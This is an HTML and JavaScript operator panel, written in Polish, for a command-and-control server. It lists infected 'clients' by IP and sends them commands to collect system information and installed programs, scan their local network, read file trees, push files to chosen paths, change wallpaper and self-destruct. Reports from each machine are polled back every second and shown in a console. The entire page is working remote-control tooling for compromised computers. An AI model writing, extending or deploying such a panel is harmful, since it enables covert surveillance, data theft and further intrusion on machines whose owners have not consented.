<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zarządzanie Serwerem C&C</title>
    <style>
        :root {
            --bg-color: #121212;
            --text-color: #e0e0e0;
            --primary-color: #00aaff;
            --secondary-color: #2c2c2c;
            --card-bg: #1e1e1e;
            --green: #4caf50;
            --red: #f44336;
            --yellow: #ffeb3b;
            --cyan: #00bcd4;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }

        .container {
            max-width: 900px;
            margin: auto;
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        h1, h2 {
            text-align: center;
            color: var(--primary-color);
        }

        .card {
            background-color: var(--card-bg);
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
        }

        .client-list, .command-panel, .console-log {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .client-item {
            background-color: var(--secondary-color);
            padding: 10px 15px;
            border-radius: 8px;
            border: 1px solid transparent;
            cursor: pointer;
            transition: background-color 0.3s, border-color 0.3s;
        }

        .client-item.active {
            border-color: var(--primary-color);
            background-color: #383838;
        }
        
        .client-item:hover {
            background-color: #383838;
        }

        .client-item h3 {
            margin: 0 0 5px 0;
            color: var(--green);
        }

        .client-item p {
            margin: 0;
            font-size: 0.9em;
            color: #b0b0b0;
        }

        .command-panel select, .command-panel input, .command-panel button {
            padding: 10px;
            border-radius: 5px;
            border: 1px solid var(--secondary-color);
            background-color: var(--bg-color);
            color: var(--text-color);
        }

        .command-panel button {
            background-color: var(--primary-color);
            border: none;
            cursor: pointer;
            font-weight: bold;
            transition: background-color 0.3s;
        }

        .command-panel button:hover {
            background-color: #0088cc;
        }

        .console-log {
            height: 400px;
            overflow-y: scroll;
            background-color: var(--bg-color);
            padding: 15px;
            border-radius: 8px;
            border: 1px solid var(--secondary-color);
        }

        .log-entry {
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .log-green { color: var(--green); }
        .log-yellow { color: var(--yellow); }
        .log-red { color: var(--red); }
        .log-cyan { color: var(--cyan); }
        .log-magenta { color: #e91e63; }
        .log-white { color: var(--text-color); }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }

        .form-group.row {
            flex-direction: row;
            gap: 10px;
        }
        
        .form-group.row input {
            flex-grow: 1;
        }

        @media (max-width: 768px) {
            .container {
                padding: 10px;
            }
            .form-group.row {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Panel Zarządzania Serwerem C&C</h1>
        
        <div id="gui-mode" class="card">
            <h2>Klienci</h2>
            <div id="client-list" class="client-list">
                <p>Ładowanie klientów...</p>
            </div>
            
            <hr>
            
            <h2>Wysyłanie Komend</h2>
            <div class="command-panel">
                <div class="form-group">
                    <label for="command-client-ip">Wybierz klienta:</label>
                    <select id="command-client-ip">
                        <option value="all">Wszyscy klienci</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="command-type">Wybierz komendę:</label>
                    <select id="command-type">
                        <option value="get-info">Pobierz informacje systemowe</option>
                        <option value="lan-print">Skanuj sieć LAN</option>
                        <option value="list-files">Wyświetl pliki</option>
                        <option value="change-wallpaper">Zmień tapetę</option>
                        <option value="transfer-file">Prześlij plik</option>
                        <option value="self-destruct">Auto-destrukcja</option>
                    </select>
                </div>
                
                <div class="form-group" id="extra-data-group" style="display:none;">
                    <label for="extra-data-input">Dodatkowe dane:</label>
                    <input type="text" id="extra-data-input" placeholder="Wpisz tutaj dane...">
                </div>

                <div class="form-group" id="file-transfer-group" style="display:none;">
                    <label for="file-input">Wybierz plik do przesłania:</label>
                    <input type="file" id="file-input">
                    <label for="target-path-input">Ścieżka docelowa na komputerze klienta:</label>
                    <input type="text" id="target-path-input" placeholder="np. C:\\Users\\Public" value="automatic">
                </div>

                <button id="send-command-btn">Wyślij Komendę</button>
            </div>
        </div>
        
        <div id="console-mode" class="card" style="display:none;">
            <h2>Konsola Serwera</h2>
            <div class="console-log" id="console-output">
                </div>
            <div class="form-group row">
                <input type="text" id="console-input" placeholder="Wpisz komendę (np. /help)">
                <button id="console-send-btn">Wyślij</button>
            </div>
        </div>
        
        <button onclick="toggleMode()">Przełącz tryb</button>
    </div>

    <script>
        const API_URL = window.location.origin;

        const clientListDiv = document.getElementById('client-list');
        const commandClientSelect = document.getElementById('command-client-ip');
        const commandTypeSelect = document.getElementById('command-type');
        const sendCommandBtn = document.getElementById('send-command-btn');
        const extraDataGroup = document.getElementById('extra-data-group');
        const extraDataInput = document.getElementById('extra-data-input');
        
        const fileTransferGroup = document.getElementById('file-transfer-group');
        const fileInput = document.getElementById('file-input');
        const targetPathInput = document.getElementById('target-path-input');
        
        const consoleOutput = document.getElementById('console-output');
        const consoleInput = document.getElementById('console-input');
        const consoleSendBtn = document.getElementById('console-send-btn');

        let isConsoleMode = false;
        
        function toggleMode() {
            isConsoleMode = !isConsoleMode;
            document.getElementById('gui-mode').style.display = isConsoleMode ? 'none' : 'block';
            document.getElementById('console-mode').style.display = isConsoleMode ? 'block' : 'none';
        }

        // GUI Logic
        async function fetchClients() {
            try {
                const response = await fetch(`${API_URL}/clients`);
                if (!response.ok) throw new Error('Network response was not ok');
                const clients = await response.json();
                
                clientListDiv.innerHTML = '';
                commandClientSelect.innerHTML = '<option value="all">Wszyscy klienci</option>';

                if (Object.keys(clients).length === 0) {
                    clientListDiv.innerHTML = '<p>Brak podłączonych klientów.</p>';
                    return;
                }

                for (const ip in clients) {
                    const details = clients[ip];
                    const lastSeen = new Date(details.last_seen * 1000).toLocaleString();
                    
                    const clientItem = document.createElement('div');
                    clientItem.className = 'client-item';
                    clientItem.innerHTML = `<h3>${ip} <span style="font-size:0.8em; color:#888;">(v${details.version})</span></h3>
                                            <p>Status: ${details.status}</p>
                                            <p>Ostatnio widziany: ${lastSeen}</p>`;
                    clientListDiv.appendChild(clientItem);

                    const option = document.createElement('option');
                    option.value = ip;
                    option.textContent = ip;
                    commandClientSelect.appendChild(option);
                }
            } catch (error) {
                clientListDiv.innerHTML = `<p style="color:var(--red);">Błąd: Nie można połączyć się z serwerem API. ${error.message}</p>`;
            }
        }
        
        function checkExtraDataVisibility() {
            const commandType = commandTypeSelect.value;
            extraDataGroup.style.display = 'none';
            fileTransferGroup.style.display = 'none';
            extraDataInput.value = '';

            if (['list-files', 'change-wallpaper'].includes(commandType)) {
                extraDataGroup.style.display = 'flex';
                extraDataInput.placeholder = 'Wpisz ścieżkę...';
            } else if (commandType === 'transfer-file') {
                fileTransferGroup.style.display = 'flex';
            }
        }
        
        async function sendFile() {
            const clientIP = commandClientSelect.value;
            const file = fileInput.files[0];
            const targetPath = targetPathInput.value;

            if (!file) {
                alert("Proszę wybrać plik do przesłania.");
                return;
            }

            if (!clientIP || clientIP === 'all') {
                alert("Proszę wybrać konkretnego klienta, aby wysłać plik.");
                return;
            }
            
            const formData = new FormData();
            formData.append('file', file);
            formData.append('client_ip', clientIP);
            formData.append('target_path', targetPath);

            try {
                const response = await fetch(`${API_URL}/upload_file`, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) throw new Error('Failed to upload file');
                
                alert('Plik wysłany pomyślnie! Komenda transferu została dodana do kolejki.');
            } catch (error) {
                alert(`Błąd podczas przesyłania pliku: ${error.message}`);
            }
        }

        async function sendCommand() {
            const commandType = commandTypeSelect.value;
            
            if (commandType === 'transfer-file') {
                await sendFile();
                return;
            }
            
            const clientIP = commandClientSelect.value;
            const extraData = extraDataInput.value;
            
            const payload = {
                type: commandType,
                data: {}
            };
            
            if (extraDataGroup.style.display !== 'none') {
                if (!extraData) {
                    alert('Proszę wprowadzić dodatkowe dane (np. ścieżkę).');
                    return;
                }
                payload.data = { path: extraData };
            }
            
            const endpoint = clientIP === 'all' ? '/send_command_to_all' : '/send_command';
            const body = {
                command: payload
            };
            if (clientIP !== 'all') {
                body.client_ip = clientIP;
            }

            try {
                const response = await fetch(`${API_URL}${endpoint}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(body)
                });
                if (!response.ok) throw new Error('Failed to send command');
                
                alert('Komenda wysłana pomyślnie!');
            } catch (error) {
                alert(`Błąd: ${error.message}`);
            }
        }

        // Console Logic
        async function fetchReports() {
            try {
                const response = await fetch(`${API_URL}/get_reports`);
                if (!response.ok) throw new Error('Failed to fetch reports');
                const reports = await response.json();
                
                reports.forEach(report => {
                    let logClass = 'log-white';
                    let logMessage = `[${report.client_ip}] -> ${report.status}`;

                    switch (report.status) {
                        case 'new_connection':
                            logClass = 'log-green';
                            logMessage = `[SERVER] Klient [${report.client_ip}] połączony pomyślnie.`;
                            break;
                        case 'lan-scan-complete':
                            logClass = 'log-cyan';
                            logMessage = `[REPORT] [${report.client_ip}] -> Wyniki skanowania sieci LAN:\n  • ${report.info.lan_devices.join('\n  • ')}`;
                            break;
                        case 'system-info-complete':
                            logClass = 'log-magenta';
                            logMessage = `[REPORT] [${report.client_ip}] [INFO SYSTEMOWE] Zgromadzone dane:\n  • System operacyjny: ${report.info.os}\n  • Katalog domowy: ${report.info.home_directory}\n  • Zainstalowane programy: ${report.info.installed_programs.slice(0, 5).join(', ')}...`;
                            break;
                        case 'file-list-complete':
                            logClass = 'log-blue';
                            logMessage = `[REPORT] [${report.client_ip}] -> Lista plików dla ścieżki '${report.info.path}':\n${JSON.stringify(report.info.file_tree, null, 2)}`;
                            break;
                        case 'script-output':
                            logClass = 'log-yellow';
                            logMessage = `[REPORT] [${report.client_ip}] -> Wynik wykonania skryptu:\n${report.info.output}`;
                            break;
                        case 'file-transfer-complete':
                            logClass = 'log-green';
                            logMessage = `[REPORT] [${report.client_ip}] -> Przesyłanie pliku '${report.info.file_name}' zakończone pomyślnie. Zapisano w: ${report.info.path}.`;
                            break;
                        case 'wallpaper-change-complete':
                            logClass = 'log-green';
                            logMessage = `[REPORT] [${report.client_ip}] -> ${report.status.replace(/-/g, ' ')}`;
                            break;
                        case 'wallpaper-change-error':
                        case 'file-transfer-error':
                            logClass = 'log-red';
                            logMessage = `[REPORT] [${report.client_ip}] -> Błąd: ${report.info.error}`;
                            break;
                    }
                    
                    const logEntry = document.createElement('pre');
                    logEntry.className = `log-entry ${logClass}`;
                    logEntry.textContent = `[${new Date(report.time * 1000).toLocaleTimeString()}] ${logMessage}`;
                    consoleOutput.appendChild(logEntry);
                    consoleOutput.scrollTop = consoleOutput.scrollHeight;
                });

            } catch (error) {
                // Log errors to console but don't clutter the UI
                console.error('Error fetching reports:', error);
            }
        }

        async function sendConsoleCommand() {
            const command = consoleInput.value.trim();
            if (!command) return;

            // Display command in console log
            const commandEntry = document.createElement('pre');
            commandEntry.className = 'log-entry';
            commandEntry.textContent = `> ${command}`;
            consoleOutput.appendChild(commandEntry);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;

            consoleInput.value = '';
            
            const parts = command.split(" ", 2);
            const mainCommand = parts[0];
            const target = parts[1] || null;
            const extraData = command.substring(command.indexOf(target) + target.length).trim() || null;
            
            let payload = null;
            let endpoint = '';
            let body = {};
            let isTargetAll = target && target.toLowerCase() === 'all';
            
            switch (mainCommand) {
                case '/list':
                    const clients = await fetchClients(); // Re-use the fetchClients function
                    if (clients) {
                        const listEntry = document.createElement('pre');
                        listEntry.className = 'log-entry log-yellow';
                        let clientListText = "--- Podłączone Klienty ---\n";
                        for (const ip in clients) {
                            const details = clients[ip];
                            const lastSeen = new Date(details.last_seen * 1000).toLocaleString();
                            clientListText += `• IP: ${ip} [Wersja: ${details.version}]\n`;
                            clientListText += `  Status: ${details.status}\n`;
                            clientListText += `  Ostatnio widziany: ${lastSeen}\n`;
                        }
                        clientListText += "--------------------------";
                        listEntry.textContent = clientListText;
                        consoleOutput.appendChild(listEntry);
                    }
                    return; // Don't send a command to the API
                case '/informacje':
                    if (target) {
                        payload = { type: "get-info", data: {} };
                        endpoint = "/send_command";
                        body = { client_ip: target, command: payload };
                    } else {
                         logMessage('Błąd: Użycie: /informacje [IP]', 'red');
                         return;
                    }
                    break;
                case '/lan-print':
                    if (isTargetAll) {
                        payload = { type: "lan-print-all", data: {} };
                        endpoint = "/send_command_to_all";
                        body = { command: payload };
                    } else if (target) {
                        payload = { type: "lan-print", data: {} };
                        endpoint = "/send_command";
                        body = { client_ip: target, command: payload };
                    } else {
                        logMessage('Błąd: Użycie: /lan-print [IP/all]', 'red');
                        return;
                    }
                    break;
                case '/list-files':
                    if (target && extraData) {
                        payload = { type: "list-files", data: { path: extraData } };
                        endpoint = "/send_command";
                        body = { client_ip: target, command: payload };
                    } else {
                        logMessage('Błąd: Użycie: /list-files [IP] [ścieżka]', 'red');
                        return;
                    }
                    break;
                case '/zmien-tapete':
                    if (target && extraData) {
                        payload = { type: "change-wallpaper", data: { path: extraData } };
                        endpoint = isTargetAll ? "/send_command_to_all" : "/send_command";
                        body = { command: payload };
                        if (!isTargetAll) body.client_ip = target;
                    } else {
                        logMessage('Błąd: Użycie: /zmien-tapete [IP/all] [ścieżka]', 'red');
                        return;
                    }
                    break;
                case '/auto-destrukcja':
                    if (target) {
                        if (confirm(`Jesteś pewien, że chcesz zniszczyć klienta${isTargetAll ? " WSZYSTKICH klientów" : ""}?`)) {
                             payload = { type: "self-destruct", data: {} };
                             endpoint = isTargetAll ? "/send_command_to_all" : "/send_command";
                             body = { command: payload };
                             if (!isTargetAll) body.client_ip = target;
                        } else {
                            return;
                        }
                    } else {
                        logMessage('Błąd: Użycie: /auto-destrukcja [IP/all]', 'red');
                        return;
                    }
                    break;
                case '/help':
                    logMessage(`
--- Lista Dostępnych Komend ---
/help - Wyświetla listę komend.
/list - Wyświetla listę podłączonych klientów.
/informacje [IP] - Zgłasza informacje systemowe klienta.
/lan-print [IP/all] - Skanuje sieć LAN klienta/wszystkich klientów.
/list-files [IP] [ścieżka] - Zwraca drzewo plików z podanej ścieżki.
/zmien-tapete [IP/all] [ścieżka] - Zmienia tapetę na podany obraz.
/auto-destrukcja [IP/all] - Wysyła polecenie samozniszczenia.
----------------------------------
                    `, 'yellow');
                    return;
                case '/clear':
                    consoleOutput.innerHTML = '';
                    return;
                case '/exit':
                    logMessage("Opuszczanie konsoli serwera...", 'yellow');
                    // In a web context, this is more of a visual message.
                    return;
                default:
                    logMessage(`Nieznana komenda: ${command}. Wpisz '/help' aby uzyskać listę komend.`, 'red');
                    return;
            }

            // Send command to API if payload was created
            if (payload) {
                try {
                    const response = await fetch(`${API_URL}${endpoint}`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(body)
                    });
                    if (!response.ok) throw new Error('Network response was not ok');
                    const result = await response.json();
                    logMessage(`[SERVER] ${result.message}`, 'green');
                } catch (error) {
                    logMessage(`Błąd: Nie można wysłać polecenia do klienta. Szczegóły: ${error.message}`, 'red');
                }
            }
        }
        
        function logMessage(message, color) {
            const entry = document.createElement('pre');
            entry.className = `log-entry log-${color}`;
            entry.textContent = message;
            consoleOutput.appendChild(entry);
            consoleOutput.scrollTop = consoleOutput.scrollHeight;
        }

        // Event Listeners
        commandTypeSelect.addEventListener('change', checkExtraDataVisibility);
        sendCommandBtn.addEventListener('click', sendCommand);
        
        consoleSendBtn.addEventListener('click', sendConsoleCommand);
        consoleInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                sendConsoleCommand();
            }
        });

        // Initial calls
        checkExtraDataVisibility();
        fetchClients();
        setInterval(fetchClients, 5000);
        setInterval(fetchReports, 1000);

        logMessage("Witamy w Konsoli Serwera. Wpisz '/help' aby uzyskać listę komend.", 'green');
        
    </script>
</body>
</html>
